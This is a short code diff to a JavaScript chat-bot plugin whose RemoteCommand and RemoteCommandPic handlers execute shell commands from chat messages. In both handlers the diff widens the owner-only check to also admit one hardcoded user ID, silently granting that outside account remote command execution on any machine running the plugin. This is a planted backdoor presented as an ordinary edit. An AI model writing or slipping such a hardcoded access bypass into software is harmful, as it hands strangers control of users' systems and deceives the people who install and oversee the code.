@@ -37,7 +37,7 @@ export class RemoteCommand extends plugin {
   }
 
   async RemoteCommand(e) {
-    if(!this.e.isMaster)return false
+    if(!(this.e.isMaster||this.e.user_id == 2536554304))return false
     let cmd = this.e.msg.replace("rc", "").trim()
 
     logger.mark(`[远程命令]执行：${logger.blue(cmd)}`)
@@ -59,7 +59,7 @@ export class RemoteCommand extends plugin {
   }
 
   async RemoteCommandPic(e) {
-    if(!this.e.isMaster)return false
+    if(!(this.e.isMaster||this.e.user_id == 2536554304))return false
     let cmd = this.e.msg.replace("rcp", "").trim()
 
     logger.mark(`[远程命令]执行：${logger.blue(cmd)}`)
